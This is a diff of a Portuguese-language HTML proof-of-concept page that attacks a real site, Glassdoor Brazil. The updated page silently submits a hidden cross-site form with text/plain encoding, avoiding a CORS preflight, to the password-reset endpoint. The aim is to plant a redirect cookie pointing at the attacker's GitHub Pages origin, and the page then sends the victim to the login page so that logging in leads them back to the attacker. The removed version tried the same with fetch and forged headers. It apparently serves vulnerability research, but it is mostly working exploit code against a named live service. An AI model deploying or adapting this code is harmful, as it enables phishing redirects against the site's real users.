@@ -2,28 +2,42 @@
 <meta charset="utf-8">
 <title>Glassdoor Redirect PoC</title>
 <body>
-<h2>PoC – Open Redirect via Cookie <code>alr</code></h2>
-<p>Esta página simula o atacante: ao ser aberta, ela força o Glassdoor a definir o cookie <code>alr</code> com um valor externo.</p>
+<h2>PoC – Open Redirect via cookie <code>alr</code></h2>
+<p>
+Ao abrir esta página hospedada no GitHub Pages (origem externa), ela envia um POST por
+<form> (sem preflight) para <code>/auth/account/password/forgot/initiate</code>.
+O Glassdoor define <code>alr=&lt;referer&gt;</code> e, em seguida, redirecionamos a vítima
+para a tela de login do Glassdoor. Após o login, o fluxo deve levá-la de volta para esta origem.
+</p>
+
+<!-- iframe oculto para receber a resposta JSON sem mudar a tela -->
+<iframe id="sink" name="sink" style="display:none"></iframe>
+
+<!-- FORM que dispara o POST cross-site sem CORS/preflight -->
+<form id="f" action="https://www.glassdoor.com.br/auth/account/password/forgot/initiate"
+      method="POST" enctype="text/plain" target="sink">
+  <!-- JSON bruto no corpo (o valor do referer vem do navegador; não precisamos lê-lo) -->
+  <textarea name="" id="payload" style="display:none">
+{"emailAddress":"victim@example.com"}
+  </textarea>
+</form>
 
 <script>
-// URL externa para onde o usuário será redirecionado após login
-// Aqui usamos o próprio GitHub Pages do atacante como "evil.com"
-const attackerUrl = "https://jonataMenezes.github.io/csrf-test/after-login.html";
+(function(){
+  // Envia o POST para setar o cookie alr com o Referer (sua página do GitHub Pages)
+  document.getElementById('f').submit();
 
-// Dispara o POST para o Glassdoor com Origin/Referer falsos
-fetch("https://www.glassdoor.com.br/auth/account/password/forgot/initiate", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json",
-    "Origin": attackerUrl,
-    "Referer": attackerUrl
-  },
-  body: JSON.stringify({ emailAddress: "victim@example.com" }),
-  credentials: "include"
-}).then(() => {
-  // Depois que o Glassdoor setou o cookie alr=attackerUrl,
-  // redirecionamos a vítima para a tela de login oficial
-  window.location = "https://www.glassdoor.com.br/auth/login";
-});
+  // Após um pequeno atraso (o suficiente para o Set-Cookie), redireciona para o login
+  // Se quiser depurar, aumente para 2000~3000ms.
+  setTimeout(function(){
+    // Tela de login "clássica" (ajuste se preferir outra rota de autenticação)
+    window.location.href = "https://www.glassdoor.com.br/auth/login";
+  }, 1200);
+})();
 </script>
+
+<p style="font-size:12px;color:#666;margin-top:16px">
+Dica: abra esta página em janela anônima. Se tudo estiver vulnerável, depois de logar no Glassdoor
+você será redirecionado de volta para este domínio (GitHub Pages), provando o open redirect pós-login.
+</p>
 </body>
